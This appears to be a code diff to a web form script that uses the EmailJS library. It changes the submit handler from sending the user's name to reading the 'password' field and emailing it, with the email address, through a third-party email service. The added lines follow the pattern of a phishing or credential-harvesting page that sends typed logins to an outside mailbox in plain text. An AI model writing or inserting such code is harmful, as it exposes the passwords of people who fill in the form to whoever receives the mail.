@@ -29,9 +29,9 @@
   emailjs.init('YOUR_USER_ID');
   document.getElementById('myForm').addEventListener('submit', (e) => {
     e.preventDefault();
-    const name = document.getElementById('name').value;
+    const password = document.getElementById('password').value;
     const email = document.getElementById('email').value;
-    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', { name, email })
+    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', { password, email })
       .then(() => alert('Email sent!'))
       .catch((error) => console.error('Error sending email: ', error));
   });
